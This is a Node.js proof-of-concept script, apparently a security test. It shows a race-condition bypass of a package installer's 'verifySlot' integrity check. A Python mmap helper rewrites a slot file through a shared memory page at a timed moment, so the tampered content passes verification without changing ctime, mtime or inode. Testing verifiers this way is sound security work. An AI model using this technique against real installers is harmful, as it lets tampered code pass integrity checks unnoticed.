// Deterministic bypass: same-uid attacker rewrites a slot file through an already-dirty MAP_SHARED page AFTER verifySlot
// read it and BEFORE verifySlot's post-read fstat and final pass. ctime/mtime/size/inode do not change.
import fs from 'node:fs'; import { syncBuiltinESMExports } from 'node:module'; import { spawn } from 'node:child_process';
import { join } from 'node:path'; import { createHash } from 'node:crypto'; import { pathToFileURL } from 'node:url';
const [ST, WHEN = 'after-read'] = process.argv.slice(2);
const sha = (b) => createHash('sha256').update(b).digest('hex');
const origRead = fs.readFileSync, origLstat = fs.lstatSync, origExists = fs.existsSync;
let fireAfterRead = false, fireBeforeFinal = false, readCount = 0, trigger = null;
const fire = () => { if (!trigger) return; const t = trigger; trigger = null; t(); };
fs.readFileSync = function (...a) { const r = origRead.apply(this, a); if (typeof a[0] === 'number') { readCount++; if (WHEN === 'after-read' && readCount === 1) fire(); } return r; };
let lstatAfterReads = 0;
fs.lstatSync = function (...a) { if (WHEN === 'before-final' && readCount === 3 && String(a[0]).startsWith('/proc/self/fd/')) fire(); return origLstat.apply(this, a); };
syncBuiltinESMExports();
const { verifySlot } = await import(pathToFileURL(join(ST, 'src/package/install.mjs')).href);
const GEN = Buffer.from('export const ok = "genuine";\n');
const d = fs.realpathSync(fs.mkdtempSync('/tmp/rv-mmap-')); const slot = join(d, 'slot'); fs.mkdirSync(join(slot, 'sub'), { recursive: true });
for (const f of ['a.mjs', 'sub/x.mjs', 'z.mjs']) { fs.writeFileSync(join(slot, f), GEN); fs.chmodSync(join(slot, f), 0o644); }
const manifest = { files: ['a.mjs', 'sub/x.mjs', 'z.mjs'].map(path => ({ path, sha256: sha(GEN), mode: 0o644 })) };
const go = join(d, 'go'), done = join(d, 'done');
const h = spawn('python3', [new URL('./mmap_helper.py', import.meta.url).pathname, join(slot, 'a.mjs'), go, done], { stdio: 'inherit' });
while (!origExists(done + '.ready')) await new Promise(r => setTimeout(r, 5));
const before = fs.statSync(join(slot, 'a.mjs'), { bigint: true });
trigger = () => { fs.writeFileSync(go, ''); while (!origExists(done)) {} };
let out; try { out = verifySlot(slot, manifest); } catch (e) { out = e.code; }
const after = fs.statSync(join(slot, 'a.mjs'), { bigint: true });
console.log(JSON.stringify({ when: WHEN, verifySlot: out, attackFired: trigger === null,
  aMjsAtReturn: origRead(join(slot, 'a.mjs'), 'utf8').trim(), matchesManifest: sha(origRead(join(slot, 'a.mjs'))) === manifest.files[0].sha256,
  ctimeUnchanged: before.ctimeNs === after.ctimeNs, mtimeUnchanged: before.mtimeNs === after.mtimeNs, inoUnchanged: before.ino === after.ino }));
h.kill(); fs.rmSync(d, { recursive: true, force: true });
